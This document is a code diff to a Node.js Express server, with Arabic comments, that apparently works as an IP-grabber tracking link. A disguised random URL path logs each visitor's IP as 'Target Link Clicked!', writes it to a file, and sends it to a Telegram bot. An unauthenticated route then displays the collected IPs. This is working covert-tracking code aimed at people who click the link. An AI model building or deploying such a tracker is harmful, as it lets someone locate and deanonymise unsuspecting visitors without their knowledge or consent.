@@ -1,20 +1,34 @@
 const express = require('express');
-const fs = require('fs'); // استدعاء موديل التعامل مع الملفات
+const fs = require('fs'); 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-app.get('/uUl8iPwh5iYTVk', (req, res) => {
+app.get('/uUl8iPwh5iYTVk', async (req, res) => {
     const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     console.log("Target Link Clicked! Visitor IP: " + visitorIp);
     
-    // تجهيز السطر المراد كتابته: التاريخ + الـ IP
+    // 1. الكتابة في الملف (كما طلبت)
     const logEntry = `${new Date().toISOString()} - IP: ${visitorIp}\n`;
-    
-    // حفظ السطر داخل ملف اسمه ips.txt
     fs.appendFile('ips.txt', logEntry, (err) => {
         if (err) console.log("Error writing to file: ", err);
     });
+
+    // 2. إرسال تنبيه لتليجرام
+    try {
+        const token = process.env.TELEGRAM_TOKEN;
+        const chatId = process.env.TELEGRAM_CHAT_ID;
+        const message = `🚨 New Visitor IP Detected!\nIP: ${visitorIp}\nTime: ${new Date().toISOString()}`;
+        
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        });
+    } catch (err) {
+        console.log("Telegram Error: ", err);
+    }
     
+    // 3. التوجيه
     res.send(`
         <!DOCTYPE html>
         <html lang="ar">
@@ -36,7 +50,6 @@ app.get('/uUl8iPwh5iYTVk', (req, res) => {
     `);
 });
 
-// مسار خاص بك أنت فقط لكي تفتح المتصفح وتشوف الـ IPs المخزنة داخل الملف
 app.get('/view-logs', (req, res) => {
     fs.readFile('ips.txt', 'utf8', (err, data) => {
         if (err) {
@@ -49,6 +62,9 @@ app.get('/view-logs', (req, res) => {
 app.get('/', (req, res) => {
     res.send('Server is active.');
 });
+
+// هذا السطر مطلوب لـ Vercel
+module.exports = app;
 
 app.listen(PORT, () => {
     console.log("Server is running...");
